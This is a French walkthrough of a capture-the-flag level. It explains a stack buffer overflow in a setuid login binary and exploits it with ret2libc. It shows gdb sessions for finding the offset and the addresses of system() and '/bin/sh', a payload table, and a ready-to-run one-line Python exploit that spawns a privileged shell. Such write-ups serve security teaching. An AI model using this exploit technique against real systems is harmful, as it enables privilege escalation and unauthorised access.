# Level01 — Walkthrough

## Analyse du binaire

Le programme demande un nom d'utilisateur, vérifie qu'il vaut `dat_wil`, puis demande un mot de passe. La vérification du mot de passe est volontairement piégée :

```c
char password[64];

puts("Enter Password: ");
fgets(password, 100, stdin);
result = verify_user_pass(password);
if (result == 0 || result != 0)
{
    puts("nope, incorrect password...\n");
    return 1;
}
```

Deux problèmes :

1. `fgets(password, 100, stdin)` lit **100 octets** dans un buffer de **64 octets** → buffer overflow sur la pile.
2. La condition `result == 0 || result != 0` est toujours vraie : on ne peut jamais sortir de `main` par la branche normale. La seule façon de détourner l'exécution est donc l'overflow.

Le binaire est en 32 bits sans NX désactivé sur la pile ? Peu importe : on n'a pas besoin de shellcode, on va faire un **ret2libc**.

## Recherche de l'offset

On envoie un pattern unique en mot de passe pour repérer combien d'octets séparent le début de `password` de l'adresse de retour sauvegardée de `main`.

```
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYYZZZZZ
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Le crash a lieu à `0x55555555` → les 4 octets `UUUU` ont écrasé l'adresse de retour. En comptant la position de `UUUU` dans le pattern, on trouve un **offset de 80 octets** avant l'adresse de retour.

## Plan d'exploitation (ret2libc)

Le binaire est setuid `level02`. On veut spawn un shell avec ces droits, donc appeler `system("/bin/sh")`. Comme on contrôle l'adresse de retour de `main`, on va la faire pointer sur `system()` et préparer la pile pour que `system()` reçoive `/bin/sh` comme argument.

### Récupération des adresses dans gdb

Adresse de `system()` :

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Adresse de la chaîne `"/bin/sh"` dans la libc :

```
(gdb) b main
(gdb) r
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
1 pattern found.
```

### Layout de la pile attendu par `system()`

Quand `main` exécute `ret`, le CPU saute à l'adresse pointée et `esp` pointe sur les octets juste après. `system()` croit avoir été appelée normalement, donc elle s'attend à :

```
[ esp     ] → son adresse de retour (où revenir quand elle a fini)
[ esp + 4 ] → son 1er argument (le char * à exécuter)
```

L'argument est lu à `esp+4`, pas à `esp`. Il faut donc bourrer `esp` avec 4 octets quelconques (la "fausse" adresse de retour de `system`) pour que `/bin/sh` tombe à la bonne position. On utilise `"osef"` parce qu'on s'en fiche : le shell sera ouvert avant que `system()` ne retourne, et on aura déjà lu le flag.

### Construction du payload

| Offset | Contenu | Rôle |
|---|---|---|
| 0 → 79 | `"A" * 80` | Padding jusqu'à l'adresse de retour |
| 80 → 83 | `\xd0\xae\xe6\xf7` | Adresse de `system()` (little-endian) → écrase l'adresse de retour de `main` |
| 84 → 87 | `"osef"` | Faux retour de `system` (ignoré, on ne reviendra jamais ici) |
| 88 → 91 | `\xec\x97\xf8\xf7` | Adresse de `"/bin/sh"` → 1er argument de `system()` |

## Exploitation

```
(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "osef" + "\xec\x97\xf8\xf7"'; cat) | ./level01
```

- `dat_wil\n` passe la vérification du nom d'utilisateur.
- Le bloc suivant est envoyé comme mot de passe et déclenche le ret2libc.
- `; cat` garde stdin ouvert après le payload pour pouvoir interagir avec le shell qui s'ouvre (sans ça, le shell se ferme immédiatement faute d'entrée).